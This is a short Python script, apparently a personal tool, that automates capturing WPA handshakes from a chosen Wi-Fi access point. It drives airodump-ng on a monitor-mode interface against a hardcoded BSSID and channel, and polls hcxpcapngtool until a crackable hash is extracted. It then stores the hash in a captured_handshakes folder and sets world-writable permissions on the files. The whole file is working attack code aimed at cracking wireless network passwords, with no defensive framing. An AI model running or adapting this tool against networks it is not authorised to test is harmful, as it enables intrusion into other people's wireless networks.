#!/usr/bin/python3
# handshake_capturer.py

import os
import subprocess
import time
import shutil

def capture_handshake(interface_name, station_mac, station_essid, station_channel, timeout):
    output_prefix = "network-traffic"
    start_time = time.time()

    airodump_process = subprocess.Popen([
        "sudo", "airodump-ng", "-w", output_prefix, "--bssid", station_mac, "--channel", str(station_channel),
        "--output-format", "pcap", "--write-interval", "2", interface_name
    ])

    try:
        while time.time() - start_time < timeout:
            time.sleep(1)
            subprocess.run(["sudo", "hcxpcapngtool", "-o", "hash", f"{output_prefix}-01.cap"], stdout=subprocess.DEVNULL)
            if os.path.exists("hash"):
                airodump_process.terminate()
                break
    except KeyboardInterrupt:
        airodump_process.terminate()
    finally:
        airodump_process.wait()

        # Change permissions of the created files
        if os.path.exists(f"{output_prefix}-01.cap"):
            subprocess.run(["sudo", "chmod", "777", f"{output_prefix}-01.cap"])
            os.remove(f"{output_prefix}-01.cap")

        if os.path.exists("hash"):
            subprocess.run(["sudo", "chmod", "777", "hash"])
            new_hash_name = f"{station_essid}-captured-hash"
            if not os.path.exists("captured_handshakes"):
                os.mkdir("captured_handshakes")
            shutil.move("hash", os.path.join("captured_handshakes", new_hash_name))
            subprocess.run(["chmod", "777", os.path.join("captured_handshakes", new_hash_name)])





interface_name = "wlp0s20f0u4"  # Monitor mode interface name
station_mac = "72:CD:D6:A1:EB:A6"  # Station MAC address
station_channel = 3  # Station channel
timeout = 6000  # Timeout in seconds

capture_handshake(interface_name, station_mac, "test-essid", station_channel, timeout)
